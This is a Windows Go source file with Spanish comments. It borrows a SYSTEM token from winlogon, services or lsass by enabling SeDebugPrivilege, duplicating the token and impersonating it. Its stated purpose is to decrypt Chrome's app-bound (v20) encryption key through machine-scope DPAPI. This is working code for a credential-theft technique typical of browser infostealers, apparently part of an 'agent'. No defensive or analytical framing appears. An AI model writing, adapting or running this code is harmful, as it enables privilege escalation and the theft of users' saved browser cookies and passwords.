//go:build windows

package win32

import (
	"errors"
	"fmt"

	"golang.org/x/sys/windows"
)

var procImpersonateLoggedOnUser = advapi32.NewProc("ImpersonateLoggedOnUser")

// systemProcesses son los primeros procesos de los que se puede tomar un token
// SYSTEM. winlogon va primero: existe en toda sesión interactiva y no es un
// proceso protegido por defecto.
var systemProcesses = []string{"winlogon.exe", "services.exe", "lsass.exe"}

// impersonateSystem duplica el token de un proceso SYSTEM y lo pone como token
// de impersonación del hilo actual. Devuelve la función que revierte.
//
// Es lo que hace falta para abrir la clave app-bound de Chrome (v20): el blob
// exterior está protegido con DPAPI en ámbito de máquina y CryptUnprotectData
// con CRYPTPROTECT_SYSTEM solo lo abre si el token que llama es SYSTEM.
func impersonateSystem() (func(), error) {
	_ = enablePrivilege("SeDebugPrivilege")

	var lastErr error
	for _, name := range systemProcesses {
		pids, err := pidsByName(name)
		if err != nil || len(pids) == 0 {
			lastErr = fmt.Errorf("%s: no está corriendo", name)
			continue
		}
		for _, pid := range pids {
			release, err := impersonatePID(pid)
			if err != nil {
				lastErr = fmt.Errorf("%s (pid %d): %w", name, pid, err)
				continue
			}
			return release, nil
		}
	}
	if lastErr == nil {
		lastErr = errors.New("sin procesos SYSTEM accesibles")
	}
	return nil, lastErr
}

func impersonatePID(pid uint32) (func(), error) {
	process, err := windows.OpenProcess(windows.PROCESS_QUERY_LIMITED_INFORMATION, false, pid)
	if err != nil {
		return nil, err
	}

	var token windows.Token
	if err := windows.OpenProcessToken(process,
		windows.TOKEN_DUPLICATE|windows.TOKEN_QUERY|windows.TOKEN_IMPERSONATE, &token); err != nil {
		_ = windows.CloseHandle(process)
		return nil, err
	}

	var duplicated windows.Token
	if err := windows.DuplicateTokenEx(token, windows.MAXIMUM_ALLOWED, nil,
		windows.SecurityImpersonation, windows.TokenImpersonation, &duplicated); err != nil {
		_ = token.Close()
		_ = windows.CloseHandle(process)
		return nil, err
	}

	ok, _, callErr := procImpersonateLoggedOnUser.Call(uintptr(duplicated))
	if ok == 0 {
		_ = duplicated.Close()
		_ = token.Close()
		_ = windows.CloseHandle(process)
		if callErr != nil {
			return nil, callErr
		}
		return nil, errors.New("ImpersonateLoggedOnUser falló")
	}

	return func() {
		_ = windows.RevertToSelf()
		_ = duplicated.Close()
		_ = token.Close()
		_ = windows.CloseHandle(process)
	}, nil
}

// DPAPIUnprotectMachine abre un blob protegido en ámbito de máquina. Primero
// lo intenta tal cual —si el agente ya corre como SYSTEM, sobra la
// impersonación— y si no, toma prestado el token de un proceso SYSTEM.
func DPAPIUnprotectMachine(data []byte) ([]byte, error) {
	plain, err := DPAPIUnprotectSystem(data)
	if err == nil {
		return plain, nil
	}

	release, impersonateErr := impersonateSystem()
	if impersonateErr != nil {
		return nil, fmt.Errorf("%v; sin token SYSTEM: %w", err, impersonateErr)
	}
	defer release()

	return DPAPIUnprotectSystem(data)
}
